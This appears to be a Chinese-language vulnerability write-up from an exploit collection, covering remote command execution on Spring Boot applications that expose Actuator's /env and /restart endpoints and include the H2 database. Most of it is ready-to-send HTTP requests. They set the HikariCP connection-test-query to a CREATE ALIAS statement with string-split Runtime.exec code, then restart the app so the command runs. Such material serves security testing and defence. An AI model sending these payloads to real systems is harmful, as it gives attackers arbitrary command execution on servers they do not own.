Spring Boot h2 database query rce
=================================

一、漏洞简介
------------

H2 database是一款Java内存数据库，多用于单元测试。H2
database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：

    spring.h2.console.enabled=true
    spring.h2.console.settings.web-allow-others=true

利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。

#### 利用条件：

-   可以 POST 请求目标网站的 `/env` 接口设置属性
-   可以 POST 请求目标网站的 `/restart` 接口重启应用（存在
    spring-boot-starter-actuator 依赖）
-   存在 `com.h2database.h2` 依赖（版本要求暂未知）

二、漏洞影响
------------

三、复现过程
------------

### 漏洞原理

1.  spring.datasource.hikari.connection-test-query
    属性被设置为一条恶意的 `CREATE ALIAS` 创建自定义函数的 SQL 语句
2.  其属性对应 HikariCP 数据库连接池的 connectionTestQuery
    配置，定义一个新数据库连接之前被执行的 SQL 语句
3.  restart 重启应用，会建立新的数据库连接
4.  如果 SQL
    语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE
    漏洞

### 漏洞复现

##### 步骤一：设置 spring.datasource.hikari.connection-test-query 属性

> ⚠️ 下面payload 中的 \'T5\' 方法每一次执行命令后都需要更换名称 (如 T6)
> ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发

spring 1.x（无回显执行命令）

    POST /env
    Content-Type: application/x-www-form-urlencoded

    spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');

spring 2.x（无回显执行命令）

    POST /actuator/env
    Content-Type: application/json

    {"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');"}

##### 步骤二：重启应用

spring 1.x

    POST /restart
    Content-Type: application/x-www-form-urlencoded

spring 2.x

    POST /actuator/restart
    Content-Type: application/json
